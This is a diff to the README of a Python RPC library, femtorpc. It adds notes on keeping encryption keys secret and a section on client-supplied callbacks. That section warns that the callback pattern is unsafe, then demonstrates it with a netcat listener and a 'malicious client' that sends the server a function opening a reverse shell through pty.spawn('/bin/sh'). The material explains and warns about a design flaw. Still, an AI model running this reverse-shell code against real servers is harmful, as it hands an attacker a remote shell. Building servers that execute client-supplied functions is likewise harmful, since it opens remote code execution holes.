@@ -217,7 +217,8 @@ Many unpleasant things can happen on RPC : performance, security... The way this
 what is basically needed : compression and encryption.
 
 Compression is done with LZ4, one of the best compression algorithm with an amazing compression/speed ratio. In the other hand, encryption is done with Fernet, a state of the art of a set of cryptographic primitives used in the [right way](https://github.com/fernet/spec/blob/master/Spec.md). The only limitation
-here is you will need a 32 bytes binary key to operate. To make it short, they are many way to create a key (passord based, key derivation, key exchange, etc) and it is out of scope of this RPC. 
+here is you will need a 32 bytes binary key to operate. To make it short, they are many way to create a key (password based, key derivation, key exchange, random tokens, etc) and it is out of scope of this RPC. One important point : this key is called **private** key or **secret** key, because if must not be *public*. 
+It must be protected and not disclosed. If the key is disclosed, your encryption will be useless anymore.
 
 client :
 
@@ -260,3 +261,102 @@ if __name__ == "__main__":
     finally:
         daemon.close()
 ```
+
+## Callback from the client side
+
+It can tempting to use callback function provided by the client. This feature is partialy available and the restiction is about the serialization : the must be serializer-compliant. For example, an event driven callbakc, call on server side when something happen, propagated to the client is not possible. This feature,
+fully implemented (EG done by pyro4) is only possible if the client create its own server to received call back from the server side and it is definitively out of scope of this library.
+
+client :
+
+``` python
+from femtorpc.tcp_proxy import TCPProxy
+
+if __name__ == "__main__":
+    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
+        def reverse(x):
+            return x[::-1]
+            
+        print(f"proxy.remote_map(reverse, ('abc', 'def')) -> {proxy.remote_map(reverse, ('abc', 'def'))}")         
+```
+
+server :
+
+``` python
+from femtorpc.tcp_daemon import TCPDaemon
+
+if __name__ == "__main__":
+    daemon = TCPDaemon("127.0.0.1", 6666)
+    def remote_map(function, iterable):
+        return list(map(function, iterable))
+        
+    daemon.register(remote_map)
+
+    try:
+        while True:
+            daemon.run_once(10, True)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        daemon.close()
+```
+
+Nevertheless, this pattern can be unsecure and unsafe by design. Client can push a slow function that will slowdown the server (deny of service). Moreover the client can push a malicious function that will compromise the server !
+
+Creating CNC with netcat (nc) on 4242/TCP :
+
+```bash
+nc -lvp 4242
+```
+
+malicious client :
+
+``` python
+from femtorpc.tcp_proxy import TCPProxy
+
+if __name__ == "__main__":
+    with TCPProxy("127.0.0.1", 6666, 100) as proxy:
+        def reverse_shell(x):
+            import socket
+            import os
+            import pty
+            import multiprocessing
+            
+            def process():
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(("127.0.0.1",4242))
+                os.dup2(s.fileno(),0)
+                os.dup2(s.fileno(),1)
+                os.dup2(s.fileno(),2)
+                
+                pty.spawn("/bin/sh")
+            
+            p = multiprocessing.Process(target=process)
+            p.start()
+
+        # nc -lvp 4242
+        proxy.remote_map(reverse_shell, [1])        
+```
+
+server :
+
+``` python
+from femtorpc.tcp_daemon import TCPDaemon
+
+if __name__ == "__main__":
+    daemon = TCPDaemon("127.0.0.1", 6666)
+    def remote_map(function, iterable):
+        return list(map(function, iterable))
+        
+    daemon.register(remote_map)
+
+    try:
+        while True:
+            daemon.run_once(100, True)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        daemon.close()
+```
+
+Start the netcat command (CNC), run the server and then run the client. In the netcat terminal, you have now a terminal on the server side. __You have been warned__. **Disclaimer** : obvioulsy, do **not** use such technics for illegal activities.
